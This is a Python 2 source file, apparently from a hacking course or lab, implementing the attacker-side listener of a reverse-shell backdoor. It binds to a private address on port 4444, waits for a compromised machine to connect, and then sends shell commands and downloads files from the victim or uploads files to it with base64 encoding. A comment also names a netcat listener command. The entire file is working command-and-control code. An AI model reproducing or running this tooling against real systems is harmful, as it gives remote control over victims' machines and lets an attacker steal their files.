# !usr/bin/env python
import socket
import json
import base64
# nc -vv -l -p 4444
class Listener:

    def __init__(self,ip,port):
        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #SOCK_STREAM is for TCP connection
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) #SO_REUSEADDR is for reusing the same port
        listener.bind((ip,port))
        listener.listen(0)
        print('[+] Waiting for incoming connection')
        self.connection, self.address=listener.accept()
        print("Got a connection from "+str(self.address))

    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data=''
        while True:
            try:
                json_data=json_data+self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    
    def write_file(self,path,content):
        with open(path,'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Download successful'
        
    
    def read_file(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read()) #use base64 encoding to handle binary data, if not throws error

    def execute_remotely(self,command):
        try:
            self.reliable_send(command)
            if command[0]=='exit':
                self.connection.close()
                exit()
            elif command[0]== 'download':
                received_data=self.reliable_receive()
                result= self.write_file(command[1],received_data)
            elif command[0]== 'upload':
                flag=self.reliable_receive()
                if flag=='ok':
                    file_content=self.read_file(command[1])
                    self.reliable_send(file_content)
                result=self.reliable_receive()
            else:
                result=self.reliable_receive()
            return result
        except Exception:
            return '[-] Error during command execution'
    
    def run(self):

        while True:
            command=raw_input(">> ")
            command=command.split(' ')
            result=self.execute_remotely(command)
            print(result)

my_listener=Listener('192.168.209.138',4444)
my_listener.run()